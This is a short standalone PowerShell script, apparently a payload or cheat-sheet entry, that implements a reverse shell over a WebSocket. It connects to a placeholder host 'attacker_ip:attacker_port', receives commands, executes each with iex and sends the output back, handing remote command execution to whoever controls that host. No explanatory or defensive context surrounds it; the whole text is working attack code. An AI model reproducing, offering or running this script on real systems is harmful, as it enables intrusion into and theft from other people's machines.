$ClientWebSocket = New-Object System.Net.WebSockets.ClientWebSocket; $uri = New-Object
System.Uri("ws://attacker_ip:attacker_port"); $ClientWebSocket.ConnectAsync($uri, $null).Result;
$buffer = New-Object Byte[] 1024; while ($ClientWebSocket.State -eq 'Open') { $received =
$ClientWebSocket.ReceiveAsync($buffer, $null).Result; $command =
[System.Text.Encoding]::ASCII.GetString($buffer, 0, $received.Count); $output = iex $command 2>&1 |
Out-String; $bytesToSend = [System.Text.Encoding]::ASCII.GetBytes($output);
$ClientWebSocket.SendAsync($bytesToSend, 'Binary', $true, $null).Wait() }
